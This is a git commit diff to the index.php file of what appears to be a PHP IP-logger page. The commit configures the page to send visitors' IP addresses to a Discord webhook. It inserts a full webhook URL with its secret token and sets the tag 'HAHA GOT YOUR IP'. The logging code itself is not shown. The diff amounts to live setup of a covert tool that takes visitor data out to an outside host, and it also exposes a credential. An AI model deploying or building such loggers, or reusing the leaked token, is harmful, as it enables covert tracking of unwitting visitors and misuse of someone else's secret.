151fd9492b69a7258d2e5eff3db7182b3c6dc051
BlueSalaser <141599612+BlueSalaser@users.noreply.github.com>
2023-08-06 22:57:51 -0400

    Update index.php

--- index.php
+++ index.php
@@ -1,9 +1,9 @@
 <?php
 
-$Webhook    = "https://discord.com/api/webhooks/"; //Webhook here
-$WebhookTag = "Ip Logger"; //Name this whatever you want
-$WebhookAvatar = "https://vgy.me/GQe9bJ.png"; //Change this to your the avatar you prefer
-$DEmbedColor = "FFFFFF"; //Change the color of the Discord Embed must be in hex "FFFFFF"
+$Webhook    = "https://discord.com/api/webhooks/1137941821356523590/dXHFFp4fxv3C6bBXbOracwW5bJt5dgw3MdBKB4Dh3si00j97xcqXjKkpyTsu_rViajYa"; //Webhook here
+$WebhookTag = "HAHA GOT YOUR IP"; //Name this whatever you want
+$WebhookAvatar = "https://www.elegantthemes.com/blog/wp-content/uploads/2020/03/what-is-an-ip-address-featured-image.jpg"; //Change this to your the avatar you prefer
+$DEmbedColor = "0000FF"; //Change the color of the Discord Embed must be in hex "FFFFFF"
 
 //                        Dont Edit Unless You Know What You're Doing!
 //\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
